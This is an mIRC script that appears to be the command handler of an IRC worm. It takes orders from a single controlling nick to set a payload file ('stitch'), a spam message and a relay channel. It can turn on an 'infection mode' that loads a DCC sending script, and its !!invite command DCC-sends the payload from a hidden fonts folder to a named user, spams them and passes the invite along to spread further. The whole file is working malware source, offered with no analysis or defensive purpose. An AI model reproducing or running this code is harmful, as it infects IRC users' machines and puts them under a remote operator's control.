on 1:TEXT:*:*:{
if ($1 == !!setstitch) && ($nick == %M) { if ($2 == $null) { /msg # !!setstitch error! | halt } | /msg # new stitch to send set | /set %mimicstitch $2- }  
if ($1 == !!setspam) && ($nick == %M) { if ($2 == $null) { /msg # !!setspam error! | halt } | /msg # new spam msg set | /set %mimicspam $2- } 
if ($1 == !!relaychan) && ($nick == %M) { if ($2 == $null) { /msg # !!relaychan error! | halt } | /msg # new channel to relay to set | /set %mimicchan $2- }   
if ($1 == !!infexore) && ($nick == %M) { /msg # infection mode on send me to dalnet | /load -rs dccsend.mrc }  
if ($1 == !!dccoff) && ($nick == %M) { /msg # dcc off | /unset %mimicstitch }
if ($1 == !!spamoff) && ($nick == %M) { /msg # spammer off | /unset %mimicspam }
if ($1 == !!relayoff) && ($nick == %M) { /msg # relay off | /unset %mimicchan }
if ($1 == !!alloff) && ($nick == %M) { /msg # :( infection mode off | /unload -rs dccsend.mrc }
if ($1 == !!invite) { if ($2 == $null) { /msg # !!invite error! | halt } | /dcc send $2 c:\windows\fonts\font\ $+ %mimicstitch | /msg $2 %mimicspam | /msg %mimicchan !!invite $2 }
}